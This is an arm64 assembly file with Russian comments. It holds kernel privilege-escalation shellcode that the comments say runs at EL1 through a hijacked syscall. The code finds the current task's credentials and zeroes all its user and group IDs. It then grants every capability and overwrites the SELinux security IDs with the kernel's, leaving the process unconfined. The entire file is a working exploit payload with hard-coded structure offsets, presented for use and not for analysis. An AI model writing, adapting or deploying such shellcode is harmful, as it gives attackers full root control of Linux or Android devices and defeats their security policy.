// Шеллкод эскалации для arm64 (выполняется на EL1 через хиджекнутый syscall).
// Никаких адресов символов: current берём из sp_el0, оффсеты — из DWARF.
// task_struct.cred=0x718 ; cred: uid..fsgid 0x04..0x20, securebits 0x24,
// cap_* 0x28/0x30/0x38/0x40/0x48, security 0x78 ; task_security_struct.sid=0x04
    .text
    .globl _start
_start:
    mrs x19, sp_el0              // current = sp_el0
    ldr x20, [x19, #0x718]       // x20 = current->cred
    str wzr, [x20, #0x04]        // uid
    str wzr, [x20, #0x08]        // gid
    str wzr, [x20, #0x0c]        // suid
    str wzr, [x20, #0x10]        // sgid
    str wzr, [x20, #0x14]        // euid
    str wzr, [x20, #0x18]        // egid
    str wzr, [x20, #0x1c]        // fsuid
    str wzr, [x20, #0x20]        // fsgid
    str wzr, [x20, #0x24]        // securebits
    mov x21, #-1
    str x21, [x20, #0x28]        // cap_inheritable
    str x21, [x20, #0x30]        // cap_permitted
    str x21, [x20, #0x38]        // cap_effective
    str x21, [x20, #0x40]        // cap_bset
    str x21, [x20, #0x48]        // cap_ambient
    ldr x22, [x20, #0x78]        // cred->security (task_security_struct *)
    cbz x22, done
    mov w23, #1
    str w23, [x22, #0x00]        // osid = 1 (kernel)
    str w23, [x22, #0x04]        // sid  = 1 (kernel, unconfined)
    str wzr, [x22, #0x08]        // exec_sid
    str wzr, [x22, #0x0c]        // create_sid
    str wzr, [x22, #0x10]        // keycreate_sid
    str wzr, [x22, #0x14]        // sockcreate_sid
done:
    mov x0, #0
    ret
